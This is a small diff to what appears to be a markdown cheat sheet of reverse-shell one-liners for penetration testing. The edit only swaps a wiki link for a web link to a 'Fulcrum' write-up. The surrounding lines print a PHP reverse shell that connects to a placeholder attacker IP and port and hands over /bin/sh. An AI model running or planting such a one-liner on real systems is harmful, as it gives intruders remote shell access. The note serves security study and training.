@@ -27,7 +27,7 @@ php -r '$sock=fsockopen(“<attacker_IP>”,<attacker_PORT>); exec(“/bin/sh -I
 <&3 >&3 2>&3”);'
 ```
 Example:
-[[Fulcrum#^e70b79]]
+[Fulcrum](https://shuciran.github.io/posts/Fulcrum/#fnref:rev-shell-php)
 
 ### Telnet
 ```bash
